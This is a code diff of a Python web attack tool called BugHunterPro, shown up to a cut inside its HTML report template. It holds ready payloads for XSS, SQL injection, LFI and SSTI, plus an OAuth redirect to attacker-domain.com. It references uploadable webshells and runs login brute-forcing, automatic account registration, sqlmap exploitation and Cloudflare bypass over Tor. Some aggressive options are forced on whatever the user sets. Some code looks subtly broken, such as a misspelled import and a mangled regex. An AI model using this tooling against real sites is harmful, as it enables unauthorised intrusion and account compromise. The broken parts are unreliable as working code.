@@ -1,3 +1,8 @@
+# Copyright (c) 2024 cenmurong. All rights reserved.
+#
+# Unauthorized copying of this file, via any medium is strictly prohibited.
+# Proprietary and confidential.
+
 import os
 import re
 import base64
@@ -15,21 +20,35 @@ from tqdm import tqdm
 import random
 import sys
 import shutil
-from concurrent.futures import ThreadPoolExecutor
+from concurrent.futures import ThreadPoolExecutor, as_completed
+PLAYWRIGHT_AVAILABLE = False
 
 try:
-    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError
-    PLAYWRIGHT_AVAILABLE = True
-except ImportError:
-    PLAYWRIGHT_AVAILABLE = False
-
-try:
-    import cloudscraper
+    import cloudscrapermi
     CLOUDSCRAPER_AVAILABLE = True
 except ImportError:
     CLOUDSCRAPER_AVAILABLE = False
 
+try:
+    import whois
+    WHOIS_AVAILABLE = True
+except ImportError:
+
+    print(
+        f"{Fore.YELLOW}[WARN] python-whois not available. Install with: pip install python-whois. WHOIS checks will be skipped.{Style.RESET_ALL}"
+    )
+    WHOIS_AVAILABLE = False
+
 init(autoreset=True)
+
+
+def silence_excepthook(*args, **kwargs):
+    pass
+
+
+if sys.version_info >= (3, 8):
+    threading.excepthook = silence_excepthook
+    sys.unraisablehook = silence_excepthook
 
 SEVERITY_SCORES = {
     "critical": 90,
@@ -51,12 +70,36 @@ def _get_full_timestamp():
     return datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
 
 
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+
+
 class BugHunterPro:
-    def __init__(self, url, cookie=None, proxy=None, wordlist=None, output_dir="report", dry_run=False,
-                 bruteforce_wordlist=None, bruteforce_username=None, bruteforce_threads=5,
-                 bruteforce_stop_on_success=False, bruteforce_throttle=None,
-                 no_ports=False, deep_scan=False, timeout=5, no_subfinder=False, no_httpx=False, no_ssrf=False, full_port_scan=False, auto_register=False,
-                 cf_bypass=False, cf_aggressive=False, use_tor=False, **kwargs):
+    def __init__(
+            self,
+            url,
+            cookie=None,
+            proxy=None,
+            wordlist=None,
+            output_dir="report",
+            dry_run=False,
+            bruteforce_wordlist=None,
+            bruteforce_username=None,
+            bruteforce_threads=5,
+            bruteforce_stop_on_success=False,
+            bruteforce_throttle=None,
+            no_ports=False,
+            deep_scan=False,
+            timeout=5,
+            no_subfinder=False,
+            no_httpx=False,
+            no_ssrf=False,
+            full_port_scan=False,
+            auto_register=False,
+            cf_bypass=False,
+            cf_aggressive=False,
+            use_tor=False,
+            silent=False,
+            **kwargs):
         self.target = self._ensure_scheme(url)
         parsed_target = urlparse(self.target)
         self.cookie = cookie
@@ -71,40 +114,67 @@ class BugHunterPro:
         self.stop_event = threading.Event()
         self.monitor_stop_signal()
         self.total_score = 0
+        self.tested_payload_urls = set()
         self.visited_urls = set()
         self.discovered_api_endpoints = set()
-        self.dynamic_params = set()
         self.scope_regex = None
-        self.shell_files = ['shell/konz.php', 'shell/konz.php.jpg']
-        self.config_path = 'misc/config.json'
-        self.payloads_dir = 'payloads'
+        self.shell_files = ['shell/konz.php',
+                            'shell/konz.php.jpg']
+        self.config_path = os.path.join(SCRIPT_DIR, 'config.json')
+        self.payloads_dir = os.path.join(SCRIPT_DIR, '..', 'payloads')
         self.in_scope_only = False
+        self.bruteforce_username = bruteforce_username or "admin"
         self.bruteforce_wordlist = bruteforce_wordlist or os.path.join(
             self.payloads_dir, 'login_wordlist.txt')
-        self.bruteforce_username = bruteforce_username
         self.bruteforce_threads = bruteforce_threads
-        self.bruteforce_stop_on_success = bruteforce_stop_on_success
-        self.bruteforce_throttle = bruteforce_throttle if bruteforce_throttle is not None else 0.1
+        self.bruteforce_stop_on_success = bruteforce_stop_on_success or True
+        self.bruteforce_throttle = bruteforce_throttle or 0.5
         self.enable_dbfinder = bool(deep_scan or (not no_ports))
         self.no_port_scan = no_ports
         self.db_deep_scan = deep_scan
         self.db_timeout = timeout
-        self.enable_cfbypass = cf_bypass
+        self.enable_cfbypass = cf_bypass or True
         self.enable_subfinder = not no_subfinder
         self.enable_httpx = not no_httpx
-        self.cf_aggressive = cf_aggressive
+        self.cf_aggressive = cf_aggressive or True
         self.cf_use_tor = use_tor
         self.full_port_scan = full_port_scan
-        self.auto_register = auto_register
+        self.auto_register = auto_register or True
         self.enable_ssrf = not no_ssrf
-        self.cf_timeout = timeout if timeout else 10
+        self.cf_timeout = timeout if timeout else 20
+        self.rate_limit = 0.5
+        self.nuclei_timeout = 600
+        self.last_request = 0
+        self.silent = silent
         try:
             with open(self.config_path, "r") as f:
                 self.config = json.load(f)
         except (FileNotFoundError, json.JSONDecodeError) as e:
             self.log("error", f"Failed to load config: {e}")
             self.config = {}
+
         self.payloads = self._load_payloads()
+
+    def extract_username(self, url):
+        patterns = [
+            r'/usr/([^/?#]+)',
+            r'/@([^/?#]+)',
+            r'/profile/([^/?#]+)',
+            r'/u/([^/?#]+)',
+            r'/user/([^/?#]+)']
+        path = urlparse(url).path
+        for p in patterns:
+            m = re.search(p, path, re.IGNORECASE)
+            if m:
+                return m.group(1)
+        return None
+
+    def _throttle(self):
+        now = time.time()
+        sleep_time = self.rate_limit - (now - self.last_request)
+        if sleep_time > 0:
+            time.sleep(sleep_time)
+        self.last_request = time.time()
 
     def monitor_stop_signal(self):
         """Periodically check for an external stop signal from an environment variable."""
@@ -136,7 +206,7 @@ class BugHunterPro:
         self.log("info", "Loading and merging payloads...")
         default_payloads = {
             "XSS": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
-            "SQLI_ERROR_BASED": ["' OR 1=1--", "\" OR 1=1--"],
+            "SQLI_ERROR_BASED": ["' OR 1=1--", '" OR 1=1--'],
             "SQLI_TIME_BASED": ["' OR SLEEP(5)--", "1;SELECT PG_SLEEP(5)--"],
             "SSTI": ["{{7*7}}", "${7*7}"],
             "LFI": ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
@@ -158,7 +228,8 @@ class BugHunterPro:
             "OAUTH_MISCONFIG": ["redirect_uri=https://attacker-domain.com"],
             "PROTOTYPE_POLLUTION": {"PAYLOADS": ["__proto__[is_polluted]=true"]}
         }
-        config_payloads = self.config.get("PAYLOADS", {})
+        config_payloads = self.config.get(
+            "PAYLOADS", {})
         merged_payloads = default_payloads.copy()
         for key, value in config_payloads.items():
             if key in merged_payloads and isinstance(
@@ -180,10 +251,85 @@ class BugHunterPro:
         self.log("success", "Payloads loaded and merged.")
         return merged_payloads
 
+    def _get_common_params_from_dorks(self):
+        """Extracts common parameter names from the dork file."""
+        dork_file_path = os.path.join(self.payloads_dir, 'dork.txt')
+        if not os.path.exists(dork_file_path):
+            return []
+
+        params = set()
+        try:
+            with open(dork_file_path, 'r', encoding='utf-8') as f:
+                for line in f:
+                    match = re.search(r'\?(\w+)=', line)
+                    if match:
+                        params.add(match.group(1))
+        except Exception as e:
+            self.log("warn", f"Could not read dork file for params: {e}")
+        return list(params)
+
+    def _add_finding(self, severity, title, details, url, module="N/A", payload="N/A"):
+        score = SEVERITY_SCORES.get(severity, 0)
+        finding = {
+            "severity": severity,
+            "title": title,
+            "details": details,
+            "message": title,
+            "evidence": details,
+            "url": url,
+            "module": module,
+            "payload": payload,
+            "score": score,
+            "timestamp": _get_full_timestamp()
+        }
+        self.findings.append(finding)
+        self.total_score += score
+        self.log(severity, f"{title}: {url}")
+
+    def test_sql_injection(self):
+        self.log("run", "Tes SQL Injection (Error & Time-based)...")
+        payloads = self.config["PAYLOADS"].get("SQLI_ERROR_BASED", []) + self.config["PAYLOADS"].get("SQLI_TIME_BASED", [])
+
+        for url in self.visited_urls:
+            parsed = urlparse(url)
+            if not parsed.query:
+                continue
+
+            for param in parse_qs(parsed.query).keys():
+                original_value = parse_qs(parsed.query)[param][0]
+
+                for payload in payloads:
+
+                    test_params = parse_qs(parsed.query)
+                    test_params[param] = payload
+                    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
+                    self.tested_payload_urls.add(test_url)
+
+                    try:
+                        response = self._safe_request("GET", test_url)
+                        if response:
+
+                            if any(err in response.text.lower() for err in ["sql", "syntax", "mysql", "error", "warning"]):
+                                self._add_finding("critical", "SQL Injection (Error)", f"Error-based | Payload: {payload}", test_url, module="SQL Injection", payload=payload)
+                                self._run_sqlmap_exploit(test_url)
+
+                            if "SLEEP" in payload.upper() or "PG_SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
+                                elapsed = response.elapsed.total_seconds()
+                                if elapsed > 4.5:
+                                    self._add_finding("high", "Blind SQLi (Time)", f"Time-based | Payload: {payload} | Delay: {elapsed:.1f}s", test_url, module="SQL Injection", payload=payload)
+                                self._run_sqlmap_exploit(test_url)
+
+                    except Exception as e:
+                        self.log("warn", f"SQLi test error: {e}")
+
     def log(self, level, msg, severity=None):
+        if self.silent:
+            return
+
         color_map = {
             "info": Fore.CYAN, "success": Fore.GREEN, "warn": Fore.YELLOW,
-            "error": Fore.RED, "run": Fore.MAGENTA, "debug": Fore.BLUE
+            "error": Fore.RED, "run": Fore.MAGENTA, "debug": Fore.BLUE,
+            "critical": Fore.RED + Style.BRIGHT, "high": Fore.YELLOW + Style.BRIGHT
         }
         icon_map = {
             "info": "[INFO]",
@@ -191,12 +337,15 @@ class BugHunterPro:
             "warn": "[WARN]",
             "error": "[ERROR]",
             "run": "[RUN]",
-            "debug": "[DEBUG]"}
+            "debug": "[DEBUG]",
+            "critical": "[CRITICAL]",
+            "high": "[HIGH]"}
         timestamp = _get_timestamp()
         color = color_map.get(level, Fore.WHITE)
         icon = icon_map.get(level, ' ')
         severity_str = f"[{severity.upper()}] " if severity else ""
-        msg = msg.encode('ascii', errors='replace').decode('ascii')
+        msg = msg.encode('ascii', errors='replace').decode(
+            'ascii')
         log_message = f"{color}[{timestamp}] {icon} {severity_str}{msg}{Style.RESET_ALL}"
         try:
             tqdm.write(log_message, file=sys.stdout)
@@ -210,10 +359,9 @@ class BugHunterPro:
             "info",
             f"Checking dependencies... PATH: {
                 os.environ.get('PATH')}")
-        if not PLAYWRIGHT_AVAILABLE:
-            self.log(
-                "warn",
-                "Playwright not available. Install with: pip install playwright && playwright install")
+        self.log(
+            "warn",
+            "Playwright is disabled as screenshot functionality is removed.")
         if not CLOUDSCRAPER_AVAILABLE:
             self.log(
                 "warn",
@@ -318,14 +466,15 @@ class BugHunterPro:
         self.log_step(
             f"Probing {
                 len(hosts)} hosts with httpx to find live servers...")
-        with open("httpx_targets.tmp", "w") as f:
-            for host in hosts:
-                f.write(self._ensure_scheme(host) + "\n")
-        command = "httpx -l httpx_targets.tmp -silent"
+
+        httpx_input = "\n".join([self._ensure_scheme(h) for h in hosts if h.strip()])
+
+        command = "httpx -silent"
         try:
             result = subprocess.run(
                 command,
                 shell=True,
+                input=httpx_input,
                 capture_output=True,
                 text=True,
                 encoding='ascii',
@@ -345,17 +494,16 @@ class BugHunterPro:
                     str(e).encode(
                         'ascii',
                         errors='replace').decode('ascii')}")
-            return []
-        finally:
-            if os.path.exists("httpx_targets.tmp"):
-                os.remove("httpx_targets.tmp")
+            return [self._ensure_scheme(h) for h in hosts if h.strip()]
+
         return [self._ensure_scheme(h) for h in hosts if h.strip()]
 
     def crawl(self):
-        self.log("info", "Starting site crawling...")
+        self.log("run", "Crawling target...")
         q = list(self.visited_urls)
         self.log("run", "Phase 1: Fast crawling for static links.")
-        with tqdm(total=len(q), desc="Fast Crawl", unit="URL", file=sys.stdout, ascii=True) as pbar:
+
+        with tqdm(total=len(q), desc="Fast Crawl", unit="URL", file=sys.stdout, ascii=True, disable=self.silent) as pbar:
             idx = 0
             while idx < len(q) and not self.stop_event.is_set():
                 current_url = q[idx]
@@ -364,7 +512,8 @@ class BugHunterPro:
                     f"Found: {len(self.visited_urls)}", refresh=True)
                 pbar.update(1)
                 try:
-                    response = self._make_request(current_url, timeout=5)
+                    response = self._safe_request("GET",
+                                                  current_url, timeout=5)
                     if response is None:
                         continue
                     if response.status_code == 403:
@@ -375,7 +524,9 @@ class BugHunterPro:
                     if 'text/html' in response.headers.get('Content-Type', ''):
 
                         links = re.findall(
-                            r'(?:href|src)=["\'](.*?)["\']', response.text, re.IGNORECASE)
+                            r'(?:href|src)=["\'](.*?)["\']',
+                            response.text,
+                            re.IGNORECASE)
                         for link in links:
                             if link and not link.startswith(
                                     ('mailto:', 'javascript:', '#')):
@@ -383,7 +534,8 @@ class BugHunterPro:
                                 full_url = self._ensure_scheme(full_url)
                                 parsed_url = urlparse(full_url)
                                 if parsed_url.scheme in [
-                                        'http', 'https'] and parsed_url.netloc == self.host and full_url not in self.visited_urls:
+                                    'http',
+                                        'https'] and parsed_url.netloc == self.host and full_url not in self.visited_urls:
                                     self.visited_urls.add(full_url)
                                     q.append(full_url)
                                     pbar.total = len(q)
@@ -397,69 +549,47 @@ class BugHunterPro:
         self.log(
             "success", f"Phase 1 completed. Found {len(self.visited_urls)} static URLs.")
         if PLAYWRIGHT_AVAILABLE:
-            self.log(
-                "run",
-                "Phase 2: Deep crawling with Playwright for dynamic links.")
-            try:
-                with sync_playwright() as p:
-                    browser = p.chromium.launch(
-                        headless=True,
-                        proxy={"server": self.proxy} if self.proxy else None,
-                        args=[
-                            '--disable-web-security',
-                            '--disable-features=IsolateOrigins,site-per-process']
-                    )
-                    page = browser.new_page()
-
-                    page.route(
-                        "**/*",
-                        lambda route: route.abort() if route.request.resource_type in [
-                            "image",
-                            "stylesheet",
-                            "font",
-                            "media"] else route.continue_())
-                    with tqdm(total=len(q), desc="Deep Crawl", unit="URL", file=sys.stdout, initial=pbar.n, ascii=True) as pbar_deep:
-                        idx = pbar.n
-                        while idx < len(q) and not self.stop_event.is_set():
-                            current_url = q[idx]
-                            idx += 1
-                            pbar_deep.set_postfix_str(
-                                f"Found: {len(self.visited_urls)}", refresh=True)
-                            try:
-                                page.goto(
-                                    current_url,
-                                    wait_until="domcontentloaded",
-                                    timeout=self.cf_timeout * 1000)
-
-                                links = page.eval_on_selector_all(
-                                    "a[href], [src]", "elements => elements.map(el => el.href || el.src)")
-                                for link in links:
-                                    if link and not link.startswith(
-                                            ('mailto:', 'javascript:', '#')):
-                                        full_url = self._ensure_scheme(
-                                            urljoin(current_url, link))
-                                        if urlparse(
-                                                full_url).netloc == self.host and full_url not in self.visited_urls:
-                                            self.visited_urls.add(full_url)
-                                            q.append(full_url)
-                                            pbar_deep.total = len(q)
-                            except (PlaywrightTimeoutError, Exception) as e:
-                                self.log(
-                                    "warn", f"Playwright failed on {current_url}: {str(e)[:100]}")
-                            pbar_deep.update(1)
-                    browser.close()
-            except Exception as e:
-                self.log("error", f"Failed to run Playwright crawl: {e}")
+            self.log("warn", "Playwright is disabled, skipping deep crawl for dynamic links.")
         else:
             self.log(
                 "warn",
                 "Playwright not available, skipping deep crawl for dynamic links.")
+
+        with open("crawled_urls.txt", "w") as f:
+            for u in sorted(list(self.visited_urls)):
+                f.write(u + "\n")
+        self.log("success", f"Crawl selesai! {len(self.visited_urls)} URL disimpan ke crawled_urls.txt")
+
         self.log(
             "success", f"Crawling completed. Found {len(self.visited_urls)} total unique URLs.")
 
+    def _discover_paths_from_config(self):
+        """
+        Adds URLs to the scan queue by combining the base URL with common paths from config.json.
+        """
+        self.log_step("Discovering common paths from config.json...")
+
+        common_paths = self.config.get("SETTINGS", {}).get("COMMON_PATHS", [])
+        api_paths = self.config.get("SETTINGS", {}).get("API_PATHS", [])
+
+        all_paths = list(set(common_paths + api_paths))
+        if not all_paths:
+            self.log("warn", "No COMMON_PATHS or API_PATHS found in config.json.")
+            return
+
+        initial_url_count = len(self.visited_urls)
+        self.log("info", f"Testing {len(all_paths)} common paths against base URL {self.base_url}...")
+
+        for path in tqdm(all_paths, desc="Discovering config paths", ascii=True, disable=self.silent):
+            full_url = urljoin(self.base_url, path.lstrip('/'))
+            self.visited_urls.add(full_url)
+
+        newly_added = len(self.visited_urls) - initial_url_count
+        self.log("success", f"Added {newly_added} new URLs from config paths to the scan queue.")
+
     def _analyze_js_content(self, content, source_url):
         api_regex = re.compile(
-            r'["\'](/[\w\-/]+(?:api|graphql)[\w\-/.]*)["\']')
+            r'["\'](/[\\w\-/]+(?:api|graphql)[\\w\-/.]*)["\"]')
         key_regex = re.compile(r"""
             (?i)(api_key|secret|token|auth|password|key|client_id|client_secret|bearer|access_token|private_key)
             \s*[:=]\s*
@@ -478,19 +608,7 @@ class BugHunterPro:
             key_value = match.group(2)
             if len(set(key_value)) < 5:
                 continue
-            self.findings.append({
-                "severity": "high",
-                "message": f"Potential hardcoded secret found in JavaScript file: {source_url}",
-                "evidence": {"matched_text": match.group(0), "key_name": match.group(1)},
-                "score": 70,
-                "timestamp": _get_full_timestamp()
-            })
-            self.total_score += 70
-            self.log(
-                "warn",
-                f"Potential secret leak in {source_url}: {
-                    match.group(1)}",
-                severity="high")
+            self._add_finding("high", "Potential hardcoded secret", {"matched_text": match.group(0), "key_name": match.group(1)}, source_url, module="API Key Leakage", payload=match.group(0))
 
     def bruteforce_login(self, wordlist, username,
                          max_workers, stop_on_success, throttle_delay):
@@ -520,8 +638,8 @@ class BugHunterPro:
             invalid_user = "gemini_invalid_user"
             invalid_pass = "gemini_invalid_pass"
             fail_payload = {user_field: invalid_user, pass_field: invalid_pass}
-            fail_response = self._make_request(
-                form_url, method="POST", data=fail_payload)
+            fail_response = self._safe_request("POST",
+                                               form_url, data=fail_payload)
             if not fail_response:
                 self.log(
                     "warn",
@@ -540,8 +658,8 @@ class BugHunterPro:
                 else:
                     u, p = username or "admin", cred_line
                 payload = {user_field: u, pass_field: p}
-                response = self._make_request(
-                    form_url, method="POST", data=payload)
+                response = self._safe_request("POST",
+                                              form_url, data=payload)
                 if throttle_delay:
                     time.sleep(throttle_delay)
                 if not response:
@@ -552,18 +670,7 @@ class BugHunterPro:
                 is_different_location = response.headers.get(
                     'Location', '') != fail_headers
                 if is_different_status or is_different_len or is_different_location:
-                    self.findings.append({
-                        "severity": "critical",
-                        "message": f"Potential valid credentials found at {form_url}",
-                        "evidence": {"username": u, "password": p, "form_fields": (user_field, pass_field)},
-                        "score": 90,
-                        "timestamp": _get_full_timestamp()
-                    })
-                    self.total_score += 90
-                    self.log(
-                        "warn",
-                        f"Potential valid credentials at {form_url}: {u}:{p}",
-                        severity="critical")
+                    self._add_finding("critical", f"Potential valid credentials found at {form_url}", {"username": u, "password": p, "form_fields": (user_field, pass_field)}, form_url, module="Bruteforce", payload=f"{u}:{p}")
                     return True
                 return False
             with ThreadPoolExecutor(max_workers=max_workers) as executor:
@@ -599,8 +706,8 @@ class BugHunterPro:
             return login_forms
 
         for url in tqdm(self.visited_urls,
-                        desc="Discovering login forms", ascii=True):
-            response = self._make_request(url)
+                        desc="Discovering login forms", ascii=True, disable=self.silent):
+            response = self._safe_request("GET", url)
             if response and 'text/html' in response.headers.get(
                     'Content-Type', ''):
                 soup = BeautifulSoup(response.text, 'html.parser')
@@ -609,10 +716,8 @@ class BugHunterPro:
                     password_input = form.find('input', {'type': 'password'})
                     if password_input:
                         user_input = form.find(
-                            'input', {
-                                'type': 'text'}) or form.find(
-                            'input', {
-                                'type': 'email'})
+                            'input', {'type': 'text'}) or form.find(
+                            'input', {'type': 'email'})
                         if user_input:
                             login_forms.append({'url': url, 'user_field': user_input.get(
                                 'name', 'username'), 'pass_field': password_input.get('name', 'password')})
@@ -630,10 +735,10 @@ class BugHunterPro:
             return
 
         for url in tqdm(self.visited_urls,
-                        desc="Searching for registration forms", ascii=True):
+                        desc="Searching for registration forms", ascii=True, disable=self.silent):
             if any(keyword in url.lower()
                    for keyword in ['register', 'signup', 'join']):
-                response = self._make_request(url)
+                response = self._safe_request("GET", url)
                 if response and 'text/html' in response.headers.get(
                         'Content-Type', ''):
                     soup = BeautifulSoup(response.text, 'html.parser')
@@ -662,8 +767,8 @@ class BugHunterPro:
                                 form_data[p_input.get('name')] = password
 
                             action_url = urljoin(url, form.get('action', ''))
-                            self._make_request(
-                                action_url, method='POST', data=form_data)
+                            self._safe_request("POST",
+                                               action_url, data=form_data)
                             self.log(
                                 "success", f"Submitted registration form at {action_url} with user: {email}")
                             return
@@ -677,10 +782,10 @@ class BugHunterPro:
         else:
             report += "The following vulnerabilities were identified:\n"
             for f in self.findings:
-                report += f"- (Score: {
-                    f['score']}, Severity: {
-                    f['severity'].upper()}) {
-                    f['message']}\n"
+                report += f"- (Score: {f.get('score', 0)}, Severity: {f.get('severity', 'N/A').upper()}) "
+                if f.get('module') and f.get('module') != 'N/A':
+                    report += f"[{f.get('module')}] "
+                report += f"{f.get('title', f.get('message', 'N/A'))}\n"
                 if 'evidence' in f:
                     report += f" - **Evidence**: {
                         json.dumps(
@@ -702,32 +807,28 @@ class BugHunterPro:
         run_report_dir = os.path.join(
             output_dir, f"report_{sanitized_host}_{run_timestamp_str}")
         os.makedirs(run_report_dir, exist_ok=True)
-        json_path = os.path.join(run_report_dir, "report.json")
-        md_path = os.path.join(run_report_dir, "hackerone_report.md")
-        html_path = os.path.join(run_report_dir, "report.html")
-        csv_path = os.path.join(run_report_dir, "report.csv")
-        with open(json_path, "w") as f:
-            json.dump({"target": self.target,
-                       "total_score": self.total_score,
-                       "findings": self.findings},
-                      f,
-                      indent=2)
-        with open(md_path, "w") as f:
+
+        with open(os.path.join(run_report_dir, "report.json"), "w") as f:
+            json.dump({"target": self.target, "total_score": self.total_score, "findings": self.findings}, f, indent=2)
+        with open(os.path.join(run_report_dir, "hackerone_report.md"), "w") as f:
             f.write(self.generate_hackerone_report())
-        import csv
+
+        csv_path = os.path.join(run_report_dir, "report.csv")
         with open(csv_path, "w", newline='') as f:
-            writer = csv.DictWriter(
-                f,
-                fieldnames=[
-                    "severity",
-                    "score",
-                    "message",
-                    "timestamp",
-                    "evidence"])
+
+            fieldnames = ["severity", "score", "module", "title", "message", "details", "url", "payload", "evidence", "timestamp"]
+            writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction='ignore')
             writer.writeheader()
             for finding in self.findings:
-                writer.writerow(finding)
-        self.log("info", f"CSV report saved at: {csv_path}")
+
+                if 'evidence' in finding and isinstance(finding['evidence'], dict):
+                    finding['evidence'] = json.dumps(finding['evidence'])
+
+                row = {k: finding.get(k, '') for k in fieldnames}
+                writer.writerow(row)
+        self.log("success", f"CSV report saved: {csv_path}")
+
+        html_path = os.path.join(run_report_dir, "report.html")
         severity_counts = {s: 0 for s in SEVERITY_SCORES.keys()}
         for f in self.findings:
             severity_counts[f['severity']] += 1
@@ -771,7 +872,7 @@ class BugHunterPro:
                 <h1>Bug Hunter V1.5 Report</h1>
                 <h2>Target: {self.host}</h2>
                 <h3>Total Risk Score: <span style="color: #ff4500; font-weight: bold;">{self.total_score} / 100</span></h3>
-                <canvas id="severityChart" width="400" height="200"></canvas>
+                <canvas id="severityChart" width="400" height="180"></canvas>
                 <h2>Finding Details</h2>
                 <div class="controls">
                     <div>
@@ -795,158 +896,181 @@ class BugHunterPro:
                         <tr>
                             <th onclick="sortTable(0)">Severity</th>
                             <th onclick="sortTable(1)">Score</th>
-                            <th onclick="sortTable(2)">Message</th>
-                            <th onclick="sortTable(3)">Timestamp</th>
+                            <th onclick="sortTable(2)">Module</th>
+                            <th onclick="sortTable(3)">Message</th>
+                            <th onclick="sortTable(4)">URL</th>
+                            <th onclick="sortTable(5)">Payload</th>
                             <th>Evidence</th>
                         </tr>
                     </thead>
                     <tbody>
         '''
         if not self.findings:
-            html += '<tr><td colspan="5" class="no-findings">No vulnerabilities found during the scan.</td></tr>'
+            html += '<tr><td colspan="7" class="no-findings">No vulnerabilities found during the scan.</td></tr>'
         else:
             for i, f in enumerate(self.findings):
                 evidence_str = json.dumps(
                     f.get(
-                        'evidence',
-                        {}),
-                    indent=2) if 'evidence' in f else "N/A"
+                        'evidence', {}),
+                    indent=2) if f.get('evidence') else "N/A"
                 html += '''
-                <tr class='severity-{}'>
-                    <td>{}</td>
-                    <td>{}</td>
-                    <td>{}</td>
-                    <td>{}</td>
-                    <td>
-                        <span class="evidence-toggle" onclick="toggleEvidence('evidence-{}')">Show/Hide</span>
-                        <div id="evidence-{}" class="evidence-content">
-                            <pre>{}</pre>
-                        </div>
-                    </td>
-                </tr>
-                '''.format(
-                    f.get('severity', 'N/A').lower(),
-                    f.get('severity', 'N/A').capitalize(),
-                    f.get('score', 'N/A'),
-                    f.get('message', 'N/A'),
-                    f.get('timestamp', 'N/A'),
-                    i,
-                    i,
-                    evidence_str
+                    <tr class='severity-{}'>
+                        <td>{}</td>
+                        <td>{}</td>
+                        <td>{}</td>
+                        <td>{}</td>
+                        <td>{}</td>
+                        <td>{}</td>
+                        <td>
+                            <span class="evidence-toggle" onclick="toggleEvidence('evidence-{}')">Show/Hide</span>
+                            <div id="evidence-{}" class="evidence-content">
+                                <p><strong>Payload:</strong> <pre>{}</pre></p>
+                                <pre>{}</pre>
+                            </div>
+                        </td>
+                    </tr>
+                    '''.format(
+                        f.get('severity', 'info').lower(),
+                        f.get('severity', 'N/A').capitalize(),
+                        f.get('score', 'N/A'),
+                        f.get('module', 'N/A'),
+                        f.get('message', 'N/A'),
+                        f.get('url', 'N/A'),
+                        f.get('payload', 'N/A'),
+                        i,
+                        i,
+                        f.get('payload', 'N/A'),
+                        evidence_str
                 )
-        html += '''
-                    </tbody>
-                </table>
-                <script>
-                    const ctx = document.getElementById('severityChart').getContext('2d');
-                    new Chart(ctx, {
-                        type: 'bar',
-                        data: {
-                            labels: ['Critical', 'High', 'Medium', 'Low', 'Info'],
-                            datasets: [{
-                                label: 'Severity Distribution',
-                                data: [%d, %d, %d, %d, %d],
-                                backgroundColor: ['#600', '#7a2d00', '#8c5a00', '#2a522a', '#2c3e50'],
-                                borderWidth: 1
-                            }]
-                        },
-                        options: {
-                            indexAxis: 'y',
-                            responsive: true,
-                            scales: {
-                                x: { beginAtZero: true, ticks: { color: '#e0e0e0' } },
-                                y: { ticks: { color: '#e0e0e0' } }
-                            }
-                        }
-                    });
-                    function filterTable() {
-                        const severityFilter = document.getElementById('severityFilter').value.toLowerCase();
-                        const searchInput = document.getElementById('searchInput').value.toLowerCase();
-                        const table = document.getElementById('findingsTable');
-                        const tr = table.getElementsByTagName('tr');
-                        for (let i = 1; i < tr.length; i++) {
-                            const severityTd = tr[i].getElementsByTagName("TD")[0];
-                            const messageTd = tr[i].getElementsByTagName("TD")[2];
-                            if (severityTd && messageTd) {
-                                const severityMatch = severityFilter === '' || severityTd.textContent.toLowerCase().includes(severityFilter);
-                                const searchMatch = messageTd.textContent.toLowerCase().includes(searchInput);
-                                if (severityMatch && searchMatch) {
-                                    tr[i].style.display = '';
-                                } else {
-                                    tr[i].style.display = 'none';
+            html += '''
+                        </tbody>
+                    </table>
+                    <script>
+                        const ctx = document.getElementById('severityChart').getContext('2d');
+                        new Chart(ctx, {
+                            type: 'bar',
+                            data: {
+                                labels: ['Critical', 'High', 'Medium', 'Low', 'Info'],
+                                datasets: [{
+                                    label: 'Severity Distribution',
+                                    data: [%d, %d, %d, %d, %d],
+                                    backgroundColor: ['#600', '#7a2d00', '#8c5a00', '#2a522a', '#2c3e50'],
+                                    borderWidth: 1
+                                }]
+                            },
+                            options: {
+                                indexAxis: 'y',
+                                responsive: true,
+                                scales: {
+                                    x: { beginAtZero: true, ticks: { color: '#e0e0e0' } },
+                                    y: { ticks: { color: '#e0e0e0' } }
                                 }
                             }
-                        }
-                    }
-                    function toggleEvidence(id) {
-                        const el = document.getElementById(id);
-                        if (el.style.display === 'block') {
-                            el.style.display = 'none';
-                        } else {
-                            el.style.display = 'block';
-                        }
-                    }
-                    function sortTable(n) {
-                        const table = document.getElementById("findingsTable");
-                        let rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
-                        switching = true;
-                        dir = "asc";
-                        while (switching) {
-                            switching = false;
-                            rows = table.rows;
-                            for (i = 1; i < (rows.length - 1); i++) {
-                                shouldSwitch = false;
-                                x = rows[i].getElementsByTagName("TD")[n];
-                                y = rows[i + 1].getElementsByTagName("TD")[n];
-                                let xContent = isNaN(parseFloat(x.innerHTML)) ? x.innerHTML.toLowerCase() : parseFloat(x.innerHTML);
-                                let yContent = isNaN(parseFloat(y.innerHTML)) ? y.innerHTML.toLowerCase() : parseFloat(y.innerHTML);
-                                if (dir == "asc") {
-                                    if (xContent > yContent) {
-                                        shouldSwitch = true;
-                                        break;
-                                    }
-                                } else if (dir == "desc") {
-                                    if (xContent < yContent) {
-                                        shouldSwitch = true;
-                                        break;
+                        });
+                        function filterTable() {
+                            const severityFilter = document.getElementById('severityFilter').value.toLowerCase();
+                            const searchInput = document.getElementById('searchInput').value.toLowerCase();
+                            const table = document.getElementById('findingsTable');
+                            const tr = table.getElementsByTagName('tr');
+                            for (let i = 1; i < tr.length; i++) {
+                                const severityTd = tr[i].getElementsByTagName("TD")[0];
+                                const messageTd = tr[i].getElementsByTagName("TD")[2];
+                                if (severityTd && messageTd) {
+                                    const severityMatch = severityFilter === '' || severityTd.textContent.toLowerCase().includes(severityFilter);
+                                    const searchMatch = messageTd.textContent.toLowerCase().includes(searchInput);
+                                    if (severityMatch && searchMatch) {
+                                        tr[i].style.display = '';
+                                    } else {
+                                        tr[i].style.display = 'none';
                                     }
                                 }
                             }
-                            if (shouldSwitch) {
-                                rows[i].parentNode.insertBefore(rows[i + 1], rows[i]);
-                                switching = true;
-                                switchcount++;
+                        }
+                        function toggleEvidence(id) {
+                            const el = document.getElementById(id);
+                            if (el.style.display === 'block') {
+                                el.style.display = 'none';
                             } else {
-                                if (switchcount == 0 && dir == "asc") {
-                                    dir = "desc";
+                                el.style.display = 'block';
+                            }
+                        }
+                        function sortTable(n) {
+                            const table = document.getElementById("findingsTable");
+                            let rows, switching, i, x, y, shouldSwitch, dir, switchcount = 0;
